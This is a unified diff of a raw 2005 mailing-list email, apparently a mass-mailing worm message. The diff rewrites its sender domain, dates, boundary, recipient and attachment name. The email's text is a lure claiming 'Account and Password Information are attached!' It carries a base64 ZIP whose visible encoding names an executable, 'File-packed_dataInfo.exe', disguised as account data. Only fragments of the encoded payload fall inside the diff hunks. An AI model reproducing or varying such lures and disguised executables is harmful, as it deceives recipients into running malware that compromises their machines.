@@ -1,29 +1,29 @@
-From: hostmaster@morcant.org
+From: hostmaster@bk.ru
 Subject: Your Password
-Date: Thu, 08 Dec 2005 13:07:26 GMT
-Message-ID: <ec1bbd.dd614dcb5@lqiic.com>
+Date: Thu, 08 Dec 2005 15:04:55 UTC
+Message-ID: <e18e3a45.9deeab13f@bk.ru>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=7e5cd0cdb3f01.b435"
+Content-Type: multipart/mixed; boundary="===94dbd981b4deb"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: torben.mathiasen@oss.sgi.com
+To: zfreemailer@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=7e5cd0cdb3f01.b435
+--===94dbd981b4deb
 
 Account and Password Information are attached!
 
 
-***** Go to: http://www.morcant.org
-***** Email: postman@morcant.org
---=7e5cd0cdb3f01.b435
-Content-Type: application/octet-stream; name=reg_pass.zip
+***** Go to: http://www.bk.ru
+***** Email: postman@bk.ru
+--===94dbd981b4deb
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=7e5cd0cdb3f01.b435--
+--===94dbd981b4deb--
